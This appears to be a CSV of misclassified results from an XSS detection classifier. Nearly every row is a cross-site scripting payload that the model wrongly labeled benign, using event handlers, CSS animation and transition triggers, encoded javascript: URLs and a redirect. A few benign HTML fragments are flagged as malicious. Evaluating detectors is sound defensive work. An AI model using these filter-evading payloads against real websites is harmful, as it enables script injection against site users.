payload,true_label,predicted_label,probabilities,inference_time_ms
"<samp draggable=""true"" ondragenter=""alert(1)"">test</samp>",1,0,"{'benign': 0.5339, 'malicious': 0.4661}",24.7297999999887
"    <input type=""hidden"" name=""area"" value=""default"" />",0,1,"{'benign': 0.4711, 'malicious': 0.5289}",22.564900000006105
"<dt onmouseup=""alert(1)"">test</dt>",1,0,"{'benign': 0.6242, 'malicious': 0.3758}",22.05199999998797
"<style>:target {color:red;}</style><var id=x style=""transition:color 1s"" ontransitionend=alert(1)></var>",1,0,"{'benign': 0.6157, 'malicious': 0.3843}",28.819800000007945
<article onpointerenter=alert(1)>XSS</article>,1,0,"{'benign': 0.5883, 'malicious': 0.4117}",21.383099999994215
"<meter onbeforepaste=""alert(1)"" contenteditable>test</meter>",1,0,"{'benign': 0.5999, 'malicious': 0.4001}",22.915600000004588
<svg><menuitem onload=alert(1)></menuitem>,1,0,"{'benign': 0.5478, 'malicious': 0.4522}",23.85540000000219
"<IMG SRC=""jav&#x09;ascript:alert('');"">",1,0,"{'benign': 0.5238, 'malicious': 0.4762}",24.60179999999923
<del onpointerenter=alert(1)>XSS</del>,1,0,"{'benign': 0.5608, 'malicious': 0.4392}",21.389300000009825
"<style oncontextmenu=""alert(1)"">test</style>",1,0,"{'benign': 0.5632, 'malicious': 0.4368}",21.6668999999996
"  <form id=""rtd-search-form"" class=""wy-form"" action=""search.html"" method=""get"">",0,1,"{'benign': 0.4714, 'malicious': 0.5286}",27.05530000000067
<s id=x tabindex=1 onfocusin=alert(1)></s>,1,0,"{'benign': 0.5102, 'malicious': 0.4898}",22.95610000000181
<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>,1,0,"{'benign': 0.5516, 'malicious': 0.4484}",23.739900000009584
"<rt draggable=""true"" ondragstart=""alert(1)"">test</rt>",1,0,"{'benign': 0.5643, 'malicious': 0.4357}",24.223699999993187
<area id=x tabindex=1 onbeforedeactivate=alert(1)></area><input autofocus>,1,0,"{'benign': 0.5514, 'malicious': 0.4486}",23.693099999988476
"<wbr draggable=""true"" ondragleave=""alert(1)"">test</wbr>",1,0,"{'benign': 0.513, 'malicious': 0.487}",23.705499999991275
<data id=x tabindex=1 onbeforeactivate=alert(1)></data>,1,0,"{'benign': 0.5606, 'malicious': 0.4394}",23.389399999999227
"<button draggable=""true"" ondragleave=""alert(1)"">test</button>",1,0,"{'benign': 0.5385, 'malicious': 0.4615}",21.613599999994904
"<template onmouseenter=""alert(1)"">test</template>",1,0,"{'benign': 0.5991, 'malicious': 0.4009}",22.37689999999759
"<dd onmouseenter=""alert(1)"">test</dd>",1,0,"{'benign': 0.552, 'malicious': 0.448}",18.83929999999623
<span id=x tabindex=1 ondeactivate=alert(1)></span><input id=y autofocus>,1,0,"{'benign': 0.5252, 'malicious': 0.4748}",25.158899999993878
"<figure onmouseout=""alert(1)"">test</figure>",1,0,"{'benign': 0.516, 'malicious': 0.484}",21.483099999997535
"<html draggable=""true"" ondragend=""alert(1)"">test</html>",1,0,"{'benign': 0.5386, 'malicious': 0.4614}",24.326200000004405
<aside id=x tabindex=1 onactivate=alert(1)></aside>,1,0,"{'benign': 0.5287, 'malicious': 0.4713}",23.122700000001828
"<head onmousedown=""alert(1)"">test</head>",1,0,"{'benign': 0.5101, 'malicious': 0.4899}",19.981199999989485
<span onpointerdown=alert(1)>XSS</span>,1,0,"{'benign': 0.538, 'malicious': 0.462}",20.73710000000517
<table onpointerup=alert(1)>XSS</table>,1,0,"{'benign': 0.5413, 'malicious': 0.4587}",21.465800000001423
<input3 onpointerover=alert(1)>XSS</input3>,1,0,"{'benign': 0.5765, 'malicious': 0.4235}",22.61339999999734
"<style>@keyframes x{}</style><address style=""animation-name:x"" onanimationend=""alert(1)""></address>",1,0,"{'benign': 0.5462, 'malicious': 0.4538}",30.51849999999945
<aside onpointermove=alert(1)>XSS</aside>,1,0,"{'benign': 0.6017, 'malicious': 0.3983}",20.24919999999497
"<ruby onmouseleave=""alert(1)"">test</ruby>",1,0,"{'benign': 0.5788, 'malicious': 0.4212}",21.894099999997252
"<small onpaste=""alert(1)"" contenteditable>test</small>",1,0,"{'benign': 0.5806, 'malicious': 0.4194}",22.447200000002
"<object onkeypress=""alert(1)"" contenteditable>test</object>",1,0,"{'benign': 0.5546, 'malicious': 0.4454}",21.77930000000572
<plaintext onfocusout=alert(1) tabindex=1 id=x></plaintext><input autofocus>,1,0,"{'benign': 0.5094, 'malicious': 0.4906}",23.455100000006723
<optgroup onpointerover=alert(1)>XSS</optgroup>,1,0,"{'benign': 0.5962, 'malicious': 0.4038}",19.074500000002104
"<dl onmouseover=""alert(1)"">test</dl>",1,0,"{'benign': 0.5837, 'malicious': 0.4163}",22.95379999999625
"<div draggable=""true"" contenteditable>drag me</div><meta ondragover=alert(1) contenteditable>drop here</meta>",1,0,"{'benign': 0.6052, 'malicious': 0.3948}",27.630900000005454
"<style draggable=""true"" ondragleave=""alert(1)"">test</style>",1,0,"{'benign': 0.5435, 'malicious': 0.4565}",24.067400000006955
<svg><code onload=alert(1)></code>,1,0,"{'benign': 0.5287, 'malicious': 0.4713}",20.2106999999927
<p onpointerout=alert(1)>XSS</p>,1,0,"{'benign': 0.5269, 'malicious': 0.4731}",18.960900000010383
"<track onmouseout=""alert(1)"">test</track>",1,0,"{'benign': 0.5205, 'malicious': 0.4795}",19.620199999991428
"<div onclick=""alert(1)"">test</div>",1,0,"{'benign': 0.5442, 'malicious': 0.4558}",19.10600000000784
<slot id=x tabindex=1 ondeactivate=alert(1)></slot><input id=y autofocus>,1,0,"{'benign': 0.522, 'malicious': 0.478}",27.244199999998386
DATASRC=#I DATAFLD=C DATAFORMATAS=HTML,1,0,"{'benign': 0.5488, 'malicious': 0.4512}",23.064099999999144
"<style>@keyframes x{}</style><slot style=""animation-name:x"" onanimationstart=""alert(1)""></slot>",1,0,"{'benign': 0.5766, 'malicious': 0.4234}",29.42820000001234
<tbody onpointermove=alert(1)>XSS</tbody>,1,0,"{'benign': 0.6629, 'malicious': 0.3371}",20.38360000000239
<svg><menu onload=alert(1)></menu>,1,0,"{'benign': 0.5207, 'malicious': 0.4793}",19.217999999995072
<ins onfocusout=alert(1) tabindex=1 id=x></ins><input autofocus>,1,0,"{'benign': 0.508, 'malicious': 0.492}",24.937899999997626
<xmp id=x tabindex=1 onfocusin=alert(1)></xmp>,1,0,"{'benign': 0.5131, 'malicious': 0.4869}",22.55010000000368
<svg><span onload=alert(1)></span>,1,0,"{'benign': 0.5518, 'malicious': 0.4482}",22.203599999997436
<animate onpointerenter=alert(1)>XSS</animate>,1,0,"{'benign': 0.5931, 'malicious': 0.4069}",22.573699999995256
<svg><title onload=alert(1)></title>,1,0,"{'benign': 0.571, 'malicious': 0.429}",19.928900000010685
"<div draggable=""true"" contenteditable>drag me</div><title ondragover=alert(1) contenteditable>drop here</title>",1,0,"{'benign': 0.603, 'malicious': 0.397}",28.60409999999547
"<textarea onmouseenter=""alert(1)"">test</textarea>",1,0,"{'benign': 0.5885, 'malicious': 0.4115}",21.204300000007947
<slot id=x tabindex=1 onfocusin=alert(1)></slot>,1,0,"{'benign': 0.5146, 'malicious': 0.4854}",23.450299999993263
"<dl oncontextmenu=""alert(1)"">test</dl>",1,0,"{'benign': 0.5737, 'malicious': 0.4263}",23.18180000000325
"<section onbeforepaste=""alert(1)"" contenteditable>test</section>",1,0,"{'benign': 0.6383, 'malicious': 0.3617}",22.348800000003166
"<tt oncopy=""alert(1)"" contenteditable>test</tt>",1,0,"{'benign': 0.5622, 'malicious': 0.4378}",22.75550000000237
<tfoot id=x tabindex=1 onactivate=alert(1)></tfoot>,1,0,"{'benign': 0.562, 'malicious': 0.438}",22.754000000006158
"<select onmouseleave=""alert(1)"">test</select>",1,0,"{'benign': 0.59, 'malicious': 0.41}",21.419299999990926
<output onpointermove=alert(1)>XSS</output>,1,0,"{'benign': 0.5515, 'malicious': 0.4485}",22.997500000002447
"<svg ondblclick=""alert(1)"">test</svg>",1,0,"{'benign': 0.5859, 'malicious': 0.4141}",22.17180000000951
"<style>:target {color: red;}</style><embed id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></embed>",1,0,"{'benign': 0.6356, 'malicious': 0.3644}",31.217299999994452
"<div draggable=""true"" contenteditable>drag me</div><h1 ondrop=alert(1) contenteditable>drop here</h1>",1,0,"{'benign': 0.581, 'malicious': 0.419}",24.90099999999984
<animatetransform onpointerenter=alert(1)>XSS</animatetransform>,1,0,"{'benign': 0.6088, 'malicious': 0.3912}",23.442199999990976
"<hgroup draggable=""true"" ondragend=""alert(1)"">test</hgroup>",1,0,"{'benign': 0.5319, 'malicious': 0.4681}",25.703800000002275
"<header onmousemove=""alert(1)"">test</header>",1,0,"{'benign': 0.582, 'malicious': 0.418}",22.240899999999897
"<style>:target {color:red;}</style><option id=x style=""transition:color 1s"" ontransitionend=alert(1)></option>",1,0,"{'benign': 0.6163, 'malicious': 0.3837}",31.621299999997632
<ol onpointerup=alert(1)>XSS</ol>,1,0,"{'benign': 0.6051, 'malicious': 0.3949}",22.657600000002276
</div>,0,1,"{'benign': 0.4444, 'malicious': 0.5556}",18.6655999999914
"<ol oncopy=""alert(1)"" contenteditable>test</ol>",1,0,"{'benign': 0.5589, 'malicious': 0.4411}",23.177399999994464
"<video onmouseout=""alert(1)"">test</video>",1,0,"{'benign': 0.5657, 'malicious': 0.4343}",22.31810000000678
"<menuitem onmousedown=""alert(1)"">test</menuitem>",1,0,"{'benign': 0.5365, 'malicious': 0.4635}",21.640999999988253
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><table id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></table>",1,0,"{'benign': 0.5908, 'malicious': 0.4092}",48.78569999999627
"<b onbeforecut=""alert(1)"" contenteditable>test</b>",1,0,"{'benign': 0.6045, 'malicious': 0.3955}",19.252199999996833
"<thead onkeypress=""alert(1)"" contenteditable>test</thead>",1,0,"{'benign': 0.5788, 'malicious': 0.4212}",23.888499999998203
"<datalist draggable=""true"" ondrag=""alert(1)"">test</datalist>",1,0,"{'benign': 0.5527, 'malicious': 0.4473}",23.555199999989895
<multicol onpointermove=alert(1)>XSS</multicol>,1,0,"{'benign': 0.6172, 'malicious': 0.3828}",20.219400000001997
<base onpointerdown=alert(1)>XSS</base>,1,0,"{'benign': 0.5656, 'malicious': 0.4344}",20.24939999999731
<canvas onpointerover=alert(1)>XSS</canvas>,1,0,"{'benign': 0.5239, 'malicious': 0.4761}",19.469000000000847
"<noframes draggable=""true"" ondragend=""alert(1)"">test</noframes>",1,0,"{'benign': 0.5396, 'malicious': 0.4604}",23.927000000000476
<menuitem onpointerover=alert(1)>XSS</menuitem>,1,0,"{'benign': 0.5301, 'malicious': 0.4699}",20.48899999999776
"<b onbeforecopy=""alert(1)"" contenteditable>test</b>",1,0,"{'benign': 0.5975, 'malicious': 0.4025}",23.1454000000042
"<meta onmouseenter=""alert(1)"">test</meta>",1,0,"{'benign': 0.5514, 'malicious': 0.4486}",20.168799999993325
"<style>:target {color:red;}</style><datalist id=x style=""transition:color 1s"" ontransitionend=alert(1)></datalist>",1,0,"{'benign': 0.642, 'malicious': 0.358}",33.26169999999706
<animate onpointerleave=alert(1)>XSS</animate>,1,0,"{'benign': 0.567, 'malicious': 0.433}",21.48040000000151
"<strike draggable=""true"" ondragstart=""alert(1)"">test</strike>",1,0,"{'benign': 0.5264, 'malicious': 0.4736}",23.436199999991914
"<style>:target {color:red;}</style><bdi id=x style=""transition:color 1s"" ontransitionend=alert(1)></bdi>",1,0,"{'benign': 0.6259, 'malicious': 0.3741}",30.7620999999898
<q onpointerup=alert(1)>XSS</q>,1,0,"{'benign': 0.5052, 'malicious': 0.4948}",17.779199999992557
"<blink oncontextmenu=""alert(1)"">test</blink>",1,0,"{'benign': 0.5469, 'malicious': 0.4531}",22.354700000008165
"<basefont onmouseleave=""alert(1)"">test</basefont>",1,0,"{'benign': 0.5431, 'malicious': 0.4569}",20.3969000000086
"<bgsound onmousedown=""alert(1)"">test</bgsound>",1,0,"{'benign': 0.5866, 'malicious': 0.4134}",22.266900000005307
<frameset id=x tabindex=1 onbeforedeactivate=alert(1)></frameset><input autofocus>,1,0,"{'benign': 0.5449, 'malicious': 0.4551}",26.532700000004183
<colgroup onfocusout=alert(1) tabindex=1 id=x></colgroup><input autofocus>,1,0,"{'benign': 0.5627, 'malicious': 0.4373}",23.978400000004285
<image src=validimage.png onloadstart=alert(1)>,1,0,"{'benign': 0.5476, 'malicious': 0.4524}",19.092999999998028
"<style>:target {transform: rotate(180deg);}</style><title id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></title>",1,0,"{'benign': 0.5829, 'malicious': 0.4171}",36.61300000000267
<font id=x tabindex=1 onbeforedeactivate=alert(1)></font><input autofocus>,1,0,"{'benign': 0.5842, 'malicious': 0.4158}",24.069699999998306
"<div draggable=""true"" contenteditable>drag me</div><form ondragover=alert(1) contenteditable>drop here</form>",1,0,"{'benign': 0.6139, 'malicious': 0.3861}",29.65879999999288
<sub onblur=alert(1) tabindex=1 id=x></sub><input autofocus>,1,0,"{'benign': 0.5712, 'malicious': 0.4288}",23.71800000000235
"<u onbeforecopy=""alert(1)"" contenteditable>test</u>",1,0,"{'benign': 0.5942, 'malicious': 0.4058}",24.12629999999183
"<rtc onkeydown=""alert(1)"" contenteditable>test</rtc>",1,0,"{'benign': 0.5503, 'malicious': 0.4497}",23.23609999999121
<iframe onpointerup=alert(1)>XSS</iframe>,1,0,"{'benign': 0.581, 'malicious': 0.419}",18.23020000000497
"<div draggable=""true"" contenteditable>drag me</div><q ondrop=alert(1) contenteditable>drop here</q>",1,0,"{'benign': 0.5757, 'malicious': 0.4243}",26.619400000001292
<data onblur=alert(1) tabindex=1 id=x></data><input autofocus>,1,0,"{'benign': 0.5313, 'malicious': 0.4687}",22.14659999999924
"<style>:target {transform: rotate(180deg);}</style><dd id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dd>",1,0,"{'benign': 0.5923, 'malicious': 0.4077}",38.073499999995875
"<style>:target {color:red;}</style><html id=x style=""transition:color 1s"" ontransitionend=alert(1)></html>",1,0,"{'benign': 0.6132, 'malicious': 0.3868}",29.55430000000092
"<frameset onpaste=""alert(1)"" contenteditable>test</frameset>",1,0,"{'benign': 0.5528, 'malicious': 0.4472}",21.387899999993465
"<tt onpaste=""alert(1)"" contenteditable>test</tt>",1,0,"{'benign': 0.6092, 'malicious': 0.3908}",24.1980000000126
"<q onbeforepaste=""alert(1)"" contenteditable>test</q>",1,0,"{'benign': 0.5263, 'malicious': 0.4737}",22.479000000004135
<s onpointerenter=alert(1)>XSS</s>,1,0,"{'benign': 0.5717, 'malicious': 0.4283}",28.368999999997868
<blink id=x tabindex=1 onbeforeactivate=alert(1)></blink>,1,0,"{'benign': 0.5513, 'malicious': 0.4487}",21.97369999998955
<samp id=x tabindex=1 onbeforedeactivate=alert(1)></samp><input autofocus>,1,0,"{'benign': 0.5709, 'malicious': 0.4291}",25.358499999995843
"<style>@keyframes slidein {}</style><div style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></div>",1,0,"{'benign': 0.5796, 'malicious': 0.4204}",40.39600000000121
"<style>:target {color: red;}</style><p id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></p>",1,0,"{'benign': 0.6175, 'malicious': 0.3825}",32.496399999999426
<slot onpointerenter=alert(1)>XSS</slot>,1,0,"{'benign': 0.6014, 'malicious': 0.3986}",22.338000000004854
"<style>@keyframes x{}</style><spacer style=""animation-name:x"" onanimationend=""alert(1)""></spacer>",1,0,"{'benign': 0.5652, 'malicious': 0.4348}",25.254900000007297
"<header onmouseup=""alert(1)"">test</header>",1,0,"{'benign': 0.6114, 'malicious': 0.3886}",22.55739999999662
"		<div id=""jump-to-nav""> </div>",0,1,"{'benign': 0.4963, 'malicious': 0.5037}",20.932200000004286
"<time ondblclick=""alert(1)"">test</time>",1,0,"{'benign': 0.6067, 'malicious': 0.3933}",20.24889999999857
<img src=validimage.png onloadend=alert(1)>,1,0,"{'benign': 0.5408, 'malicious': 0.4592}",21.382299999999077
"<div onpaste=""alert(1)"" contenteditable>test</div>",1,0,"{'benign': 0.5493, 'malicious': 0.4507}",22.541200000006256
"<hr onmouseup=""alert(1)"">test</hr>",1,0,"{'benign': 0.6166, 'malicious': 0.3834}",22.284299999995483
<legend onpointerleave=alert(1)>XSS</legend>,1,0,"{'benign': 0.5999, 'malicious': 0.4001}",20.888600000006363
"<strike onmousemove=""alert(1)"">test</strike>",1,0,"{'benign': 0.5767, 'malicious': 0.4233}",20.86390000000904
"<basefont onbeforecopy=""alert(1)"" contenteditable>test</basefont>",1,0,"{'benign': 0.6022, 'malicious': 0.3978}",18.50679999999727
"<nav onbeforecut=""alert(1)"" contenteditable>test</nav>",1,0,"{'benign': 0.5983, 'malicious': 0.4017}",22.448799999992275
"<header onkeypress=""alert(1)"" contenteditable>test</header>",1,0,"{'benign': 0.6086, 'malicious': 0.3914}",22.36560000000054
"<frameset draggable=""true"" ondragenter=""alert(1)"">test</frameset>",1,0,"{'benign': 0.5049, 'malicious': 0.4951}",23.99770000000956
"<style>:target {color:red;}</style><embed id=x style=""transition:color 1s"" ontransitionend=alert(1)></embed>",1,0,"{'benign': 0.6285, 'malicious': 0.3715}",31.818600000008246
<b id=x tabindex=1 onactivate=alert(1)></b>,1,0,"{'benign': 0.5319, 'malicious': 0.4681}",24.022200000004545
<del onpointerup=alert(1)>XSS</del>,1,0,"{'benign': 0.576, 'malicious': 0.424}",19.09729999999854
"<strong oncontextmenu=""alert(1)"">test</strong>",1,0,"{'benign': 0.5718, 'malicious': 0.4282}",22.389500000002727
<figure id=x tabindex=1 onbeforedeactivate=alert(1)></figure><input autofocus>,1,0,"{'benign': 0.5316, 'malicious': 0.4684}",23.628900000005615
"<noscript onmousedown=""alert(1)"">test</noscript>",1,0,"{'benign': 0.6016, 'malicious': 0.3984}",20.245100000011007
"<main onbeforepaste=""alert(1)"" contenteditable>test</main>",1,0,"{'benign': 0.6045, 'malicious': 0.3955}",17.97220000000266
<nextid id=x tabindex=1 ondeactivate=alert(1)></nextid><input id=y autofocus>,1,0,"{'benign': 0.5335, 'malicious': 0.4665}",20.875900000007164
"<head draggable=""true"" ondragstart=""alert(1)"">test</head>",1,0,"{'benign': 0.5133, 'malicious': 0.4867}",20.6486999999953
"<style>@keyframes slidein {}</style><strong style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></strong>",1,0,"{'benign': 0.5935, 'malicious': 0.4065}",37.53799999999785
<s onblur=alert(1) tabindex=1 id=x></s><input autofocus>,1,0,"{'benign': 0.5448, 'malicious': 0.4552}",24.25569999999766
"<base onkeypress=""alert(1)"" contenteditable>test</base>",1,0,"{'benign': 0.6055, 'malicious': 0.3945}",23.26460000000452
"<article onmouseout=""alert(1)"">test</article>",1,0,"{'benign': 0.5444, 'malicious': 0.4556}",20.28819999999598
<noframes onpointerover=alert(1)>XSS</noframes>,1,0,"{'benign': 0.5814, 'malicious': 0.4186}",21.021099999998683
"<blink onbeforecopy=""alert(1)"" contenteditable>test</blink>",1,0,"{'benign': 0.609, 'malicious': 0.391}",21.546400000005406
<animatemotion onpointerdown=alert(1)>XSS</animatemotion>,1,0,"{'benign': 0.5954, 'malicious': 0.4046}",22.698800000000574
<tt id=x tabindex=1 ondeactivate=alert(1)></tt><input id=y autofocus>,1,0,"{'benign': 0.562, 'malicious': 0.438}",28.01759999999831
"<colgroup onmouseenter=""alert(1)"">test</colgroup>",1,0,"{'benign': 0.6575, 'malicious': 0.3425}",21.51770000000397
<i onfocusout=alert(1) tabindex=1 id=x></i><input autofocus>,1,0,"{'benign': 0.5253, 'malicious': 0.4747}",24.092800000005354
"<style>@keyframes x{}</style><canvas style=""animation-name:x"" onanimationstart=""alert(1)""></canvas>",1,0,"{'benign': 0.574, 'malicious': 0.426}",29.084799999992583
<b onpointerover=alert(1)>XSS</b>,1,0,"{'benign': 0.5276, 'malicious': 0.4724}",18.867999999997664
"<big onmouseout=""alert(1)"">test</big>",1,0,"{'benign': 0.5937, 'malicious': 0.4063}",18.99219999999957
"	 <div> </div> </td> </tr><tr><td class=""navbox-abovebelow"" colspan=""2"">",0,1,"{'benign': 0.4735, 'malicious': 0.5265}",28.39500000000328
<u id=x tabindex=1 onbeforeactivate=alert(1)></u>,1,0,"{'benign': 0.5373, 'malicious': 0.4627}",24.36790000000144
"<style>:target {transform: rotate(180deg);}</style><abbr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></abbr>",1,0,"{'benign': 0.632, 'malicious': 0.368}",37.98659999999643
"<basefont onmouseenter=""alert(1)"">test</basefont>",1,0,"{'benign': 0.5619, 'malicious': 0.4381}",21.347000000005778
<strike onpointerover=alert(1)>XSS</strike>,1,0,"{'benign': 0.5667, 'malicious': 0.4333}",21.84740000001284
"<isindex oncut=""alert(1)"" contenteditable>test</isindex>",1,0,"{'benign': 0.5787, 'malicious': 0.4213}",24.052999999994995
"<audio autoplay controls onvolumechange=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1,0,"{'benign': 0.6513, 'malicious': 0.3487}",30.023999999997386
<i onpointerup=alert(1)>XSS</i>,1,0,"{'benign': 0.6078, 'malicious': 0.3922}",15.847699999994802
"<style>:target {color:red;}</style><mark id=x style=""transition:color 1s"" ontransitionend=alert(1)></mark>",1,0,"{'benign': 0.6125, 'malicious': 0.3875}",31.19009999998923
"<hgroup draggable=""true"" ondragenter=""alert(1)"">test</hgroup>",1,0,"{'benign': 0.5444, 'malicious': 0.4556}",25.50109999999961
<canvas onpointerleave=alert(1)>XSS</canvas>,1,0,"{'benign': 0.5854, 'malicious': 0.4146}",20.449099999993336
"<datalist onbeforecopy=""alert(1)"" contenteditable>test</datalist>",1,0,"{'benign': 0.639, 'malicious': 0.361}",22.946099999998637
<section id=x tabindex=1 onbeforeactivate=alert(1)></section>,1,0,"{'benign': 0.5485, 'malicious': 0.4515}",22.121099999992566
"<small onkeyup=""alert(1)"" contenteditable>test</small>",1,0,"{'benign': 0.6003, 'malicious': 0.3997}",21.535299999996482
<bdo id=x tabindex=1 onfocus=alert(1)></bdo>,1,0,"{'benign': 0.5813, 'malicious': 0.4187}",23.943099999996775
"<header draggable=""true"" ondragleave=""alert(1)"">test</header>",1,0,"{'benign': 0.5651, 'malicious': 0.4349}",22.644800000009013
"<tfoot draggable=""true"" ondragend=""alert(1)"">test</tfoot>",1,0,"{'benign': 0.5498, 'malicious': 0.4502}",22.914900000003513
<input3 onpointerleave=alert(1)>XSS</input3>,1,0,"{'benign': 0.5992, 'malicious': 0.4008}",19.805700000006254
javascript:document.location='http://www.google.com/,1,0,"{'benign': 0.5086, 'malicious': 0.4914}",21.09139999998888
"<track onmouseleave=""alert(1)"">test</track>",1,0,"{'benign': 0.5704, 'malicious': 0.4296}",19.923800000000824
"<kbd draggable=""true"" ondragstart=""alert(1)"">test</kbd>",1,0,"{'benign': 0.5198, 'malicious': 0.4802}",24.155600000000277
"<style>:target {transform: rotate(180deg);}</style><button id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></button>",1,0,"{'benign': 0.5917, 'malicious': 0.4083}",35.95719999999858
          </div>,0,1,"{'benign': 0.4444, 'malicious': 0.5556}",16.34119999999939
"<video onmouseup=""alert(1)"">test</video>",1,0,"{'benign': 0.6245, 'malicious': 0.3755}",19.712799999993535
"<main oncut=""alert(1)"" contenteditable>test</main>",1,0,"{'benign': 0.5596, 'malicious': 0.4404}",18.903800000003912
"<button onkeypress=""alert(1)"" contenteditable>test</button>",1,0,"{'benign': 0.5879, 'malicious': 0.4121}",22.158000000004563
"<head onclick=""alert(1)"">test</head>",1,0,"{'benign': 0.5434, 'malicious': 0.4566}",16.035000000002242
<svg><tt onload=alert(1)></tt>,1,0,"{'benign': 0.6044, 'malicious': 0.3956}",16.25989999999433
"<nav onkeypress=""alert(1)"" contenteditable>test</nav>",1,0,"{'benign': 0.5696, 'malicious': 0.4304}",21.206499999991024
"<audio autoplay onplay=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1,0,"{'benign': 0.6236, 'malicious': 0.3764}",25.23180000000025
"<rb onmousemove=""alert(1)"">test</rb>",1,0,"{'benign': 0.6002, 'malicious': 0.3998}",15.536900000000742
"<tfoot onmouseover=""alert(1)"">test</tfoot>",1,0,"{'benign': 0.5907, 'malicious': 0.4093}",22.17399999999259
<param id=x tabindex=1 onbeforedeactivate=alert(1)></param><input autofocus>,1,0,"{'benign': 0.5083, 'malicious': 0.4917}",27.129699999989043
"<bdo onkeypress=""alert(1)"" contenteditable>test</bdo>",1,0,"{'benign': 0.5959, 'malicious': 0.4041}",23.189200000004462
<svg><em onload=alert(1)></em>,1,0,"{'benign': 0.6018, 'malicious': 0.3982}",20.690800000011222
<image onblur=alert(1) tabindex=1 id=x></image><input autofocus>,1,0,"{'benign': 0.5385, 'malicious': 0.4615}",26.136100000002216
"<style>@keyframes x{}</style><small style=""animation-name:x"" onanimationend=""alert(1)""></small>",1,0,"{'benign': 0.5618, 'malicious': 0.4382}",29.50309999999945
<ul onpointerenter=alert(1)>XSS</ul>,1,0,"{'benign': 0.5773, 'malicious': 0.4227}",21.637999999995827
"<meta draggable=""true"" ondragenter=""alert(1)"">test</meta>",1,0,"{'benign': 0.5125, 'malicious': 0.4875}",24.810500000000957
"<div draggable=""true"" contenteditable>drag me</div><script ondrop=alert(1) contenteditable>drop here</script>",1,0,"{'benign': 0.5909, 'malicious': 0.4091}",31.973399999998264
"<style>:target {transform: rotate(180deg);}</style><caption id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></caption>",1,0,"{'benign': 0.5806, 'malicious': 0.4194}",37.38380000000063
<multicol onpointerleave=alert(1)>XSS</multicol>,1,0,"{'benign': 0.6167, 'malicious': 0.3833}",21.903800000004026
"<style>@keyframes x{}</style><s style=""animation-name:x"" onanimationend=""alert(1)""></s>",1,0,"{'benign': 0.5631, 'malicious': 0.4369}",28.14250000000129
<details id=x tabindex=1 onactivate=alert(1)></details>,1,0,"{'benign': 0.5299, 'malicious': 0.4701}",22.143399999990265
<svg><blockquote onload=alert(1)></blockquote>,1,0,"{'benign': 0.5919, 'malicious': 0.4081}",23.62649999999178
<samp onpointerenter=alert(1)>XSS</samp>,1,0,"{'benign': 0.5961, 'malicious': 0.4039}",20.6698000000074
"<svg onmousemove=""alert(1)"">test</svg>",1,0,"{'benign': 0.574, 'malicious': 0.426}",18.541700000000105
<dfn id=x tabindex=1 onfocus=alert(1)></dfn>,1,0,"{'benign': 0.6118, 'malicious': 0.3882}",22.67069999999194
<blockquote onpointerleave=alert(1)>XSS</blockquote>,1,0,"{'benign': 0.5691, 'malicious': 0.4309}",22.067699999993806
"<th onmouseleave=""alert(1)"">test</th>",1,0,"{'benign': 0.561, 'malicious': 0.439}",17.559299999987843
<track id=x tabindex=1 onbeforedeactivate=alert(1)></track><input autofocus>,1,0,"{'benign': 0.5473, 'malicious': 0.4527}",23.48159999999666
"<source onmousedown=""alert(1)"">test</source>",1,0,"{'benign': 0.616, 'malicious': 0.384}",20.150000000001
"<html oncopy=""alert(1)"" contenteditable>test</html>",1,0,"{'benign': 0.5654, 'malicious': 0.4346}",20.805800000005092
"<applet onmouseleave=""alert(1)"">test</applet>",1,0,"{'benign': 0.5996, 'malicious': 0.4004}",21.727699999999572
<table id=x tabindex=1 onbeforeactivate=alert(1)></table>,1,0,"{'benign': 0.52, 'malicious': 0.48}",17.786400000005642
"<button onmouseup=""alert(1)"">test</button>",1,0,"{'benign': 0.6047, 'malicious': 0.3953}",15.898300000003474
